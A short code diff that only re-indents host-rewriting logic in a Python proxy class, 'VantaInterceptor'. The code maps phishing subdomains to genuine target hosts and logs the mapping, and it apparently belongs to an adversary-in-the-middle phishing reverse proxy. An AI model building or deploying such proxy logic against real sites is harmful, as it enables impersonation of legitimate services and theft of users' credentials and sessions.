@@ -81,17 +81,17 @@ class VantaInterceptor:
         # (Simplified matching logic for V5 MVP)
         for phish_sub, target_host in target_map.items():
             if phish_sub in host:
-                 flow.request.host = target_host
-                 try:
-                     if not hasattr(flow, "metadata"):
-                         flow.metadata = {}
-                 except Exception:
-                     pass
-                 try:
-                     flow.metadata["v_ph_host"] = host
-                     flow.metadata["v_tgt_host"] = target_host
-                 except Exception:
-                     pass
+                flow.request.host = target_host
+                try:
+                    if not hasattr(flow, "metadata"):
+                        flow.metadata = {}
+                except Exception:
+                    pass
+                try:
+                    flow.metadata["v_ph_host"] = host
+                    flow.metadata["v_tgt_host"] = target_host
+                except Exception:
+                    pass
                 self.logger.debug(f"Rewrote host: {host} -> {target_host}")
                 break
         
